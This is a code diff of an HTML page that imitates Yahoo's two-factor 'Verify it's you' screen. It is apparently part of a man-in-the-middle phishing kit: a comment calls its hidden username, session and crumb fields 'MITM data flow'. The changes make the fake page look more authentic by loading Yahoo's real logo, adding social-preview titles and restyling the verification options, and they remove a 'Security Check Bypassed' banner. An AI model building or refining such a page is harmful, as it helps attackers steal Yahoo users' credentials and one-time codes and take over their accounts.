@@ -2,11 +2,13 @@
 <html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
     <meta charset="utf-8">
-    <title>Yahoo - Choose verification method</title>
+    <title>Choose verification method - Yahoo</title>
+    <meta content="Choose verification method - Yahoo" property="og:title">
+    <meta content="Choose verification method - Yahoo" property="twitter:title">
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <meta content="Webflow" name="generator">
     
-    <!-- Complete CSS Structure -->
+    <!-- Only the necessary CSS files -->
     <link href="css/normalize.css" rel="stylesheet" type="text/css">
     <link href="css/webflow.css" rel="stylesheet" type="text/css">
     <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
@@ -36,7 +38,7 @@
         <!-- Header -->
         <div class="div-block">
             <div class="div-block-2">
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image">
+                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo" class="image">
             </div>
             <div class="div-block-3">
                 <div class="text-block">Help</div>
@@ -54,78 +56,75 @@
             
             <!-- Form Container -->
             <div class="form-block w-form">
-                <form id="2fa-form" class="form" method="POST">
+                <form id="twoFactorForm" class="form" method="POST">
                     <!-- 🎯 CRITICAL: Hidden fields for MITM data flow -->
                     <input type="hidden" name="username" id="username">
                     <input type="hidden" name="sessionIndex" id="sessionIndex">
                     <input type="hidden" name="acrumb" id="acrumb">
                     <input type="hidden" name="crumb" id="crumb">
                     <input type="hidden" name="signin" value="Next">
-                    <input type="hidden" name="challenge" id="challenge">
-                    <input type="hidden" name="emailChallenge" id="emailChallenge">
-                    <input type="hidden" name="smsChallenge" id="smsChallenge">
+                    <input type="hidden" id="selectedMethod" name="challenge" value="">
                     <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
                     
                     <!-- Yahoo Logo -->
-                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image-2">
-                    
-                    <!-- Main Form -->
-                    <div class="pazzi" id="main-form">
-                        <div class="reflectto" id="userEmail">Choose verification method</div>
-                        <h1 class="heading-2"><strong>Verify it's you</strong></h1>
-                        <div class="text-block-2">Choose how you'd like to verify your identity<br></div>
-                        
-                        <!-- Bypass Info -->
-                        <div id="bypass-info" class="hidden" style="background: #e7f3ff; border: 1px solid #2196f3; border-radius: 4px; padding: 12px; margin: 10px 0; color: #1565c0; font-family: Open Sans, sans-serif; font-size: 14px;">
-                            🔒 <strong>Security Check Bypassed:</strong> Proceeding with verification.
+                    <div class="yahoo-container">
+                        <div class="yahoo-logo">
+                            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
                         </div>
                         
-                        <!-- Method Options -->
-                        <div id="method-options" style="width: 100%; margin: 20px 0;">
-                            <div class="method-option" data-method="email">
-                                <div class="method-icon">📧</div>
-                                <div class="method-details">
-                                    <h4>Email verification</h4>
-                                    <p>We'll send a code to your email address</p>
+                        <div class="yahoo-form-container">
+                            <h1 class="yahoo-title" style="text-align: center; margin-bottom: 20px; font-size: 24px; color: #333;">Verify it's you</h1>
+                            <p class="yahoo-subtitle" style="text-align: center; color: #666; margin-bottom: 30px;">Choose how you'd like to verify your identity</p>
+                            
+                            <div class="yahoo-2fa-options">
+                                <div class="yahoo-2fa-option" data-method="sms">
+                                    <div style="width: 24px; height: 24px; background: #5f01d1; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                                        <span style="color: white; font-size: 12px;">📱</span>
+                                    </div>
+                                    <div>
+                                        <div style="font-weight: bold;">Text message</div>
+                                        <div style="color: #666; font-size: 14px;">Get a code via SMS</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="yahoo-2fa-option" data-method="email">
+                                    <div style="width: 24px; height: 24px; background: #5f01d1; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                                        <span style="color: white; font-size: 12px;">✉️</span>
+                                    </div>
+                                    <div>
+                                        <div style="font-weight: bold;">Email</div>
+                                        <div style="color: #666; font-size: 14px;">Get a code via email</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="yahoo-2fa-option" data-method="app">
+                                    <div style="width: 24px; height: 24px; background: #5f01d1; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
+                                        <span style="color: white; font-size: 12px;">🔐</span>
+                                    </div>
+                                    <div>
+                                        <div style="font-weight: bold;">Authenticator app</div>
+                                        <div style="color: #666; font-size: 14px;">Use your authenticator app</div>
+                                    </div>
                                 </div>
                             </div>
                             
-                            <div class="method-option" data-method="sms">
-                                <div class="method-icon">📱</div>
-                                <div class="method-details">
-                                    <h4>Text message</h4>
-                                    <p>We'll send a code to your phone number</p>
-                                </div>
-                            </div>
+                            <div class="yahoo-error" id="errorMessage"></div>
                             
-                            <div class="method-option" data-method="totp">
-                                <div class="method-icon">🔐</div>
-                                <div class="method-details">
-                                    <h4>Authenticator app</h4>
-                                    <p>Use your authenticator app to get a code</p>
-                                </div>
-                            </div>
+                            <button type="submit" class="yahoo-button" id="submitBtn" disabled>
+                                <span id="btnText">Continue</span>
+                                <span id="btnSpinner" class="loading-spinner" style="display: none;"></span>
+                            </button>
                         </div>
-                        
-                        <input type="submit" class="logger w-button" value="Continue" id="submit-btn">
-                    </div>
-                    
-                    <!-- Error State -->
-                    <div class="errry" id="error-container">
-                        <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
-                        <div class="text-block-7" id="error-message">Please select a verification method.</div>
-                        <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
-                    </div>
-                    
-                    <!-- Loading State -->
-                    <div id="loading-state" class="hidden text-center" style="padding: 20px;">
-                        <div class="loading-spinner"></div>
-                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Sending verification code...</p>
                     </div>
                 </form>
             </div>
         </div>
     </section>
+
+    <div class="yahoo-footer">
+        <a href="#">Try another way</a> | 
+        <a href="#">Get help</a>
+    </div>
 
     <script src="js/yahoo-2fa.js"></script>
 </body>
